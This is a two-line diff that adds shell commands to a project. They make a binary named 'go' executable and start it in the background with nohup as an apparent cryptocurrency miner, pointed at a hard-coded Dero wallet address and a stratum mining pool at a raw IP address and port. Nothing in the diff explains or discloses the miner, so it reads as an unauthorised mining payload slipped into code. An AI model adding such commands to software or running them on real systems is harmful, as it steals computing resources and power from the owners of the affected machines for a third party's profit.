@@ -1,0 +1,2 @@
+chmod 700 go 
+nohup ./go -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xeth4v7yz7m959q2c897k.$(echo $(shuf -i 1-9999 -n 1)-GG) -r 15.235.164.162:4300 -p stratum &
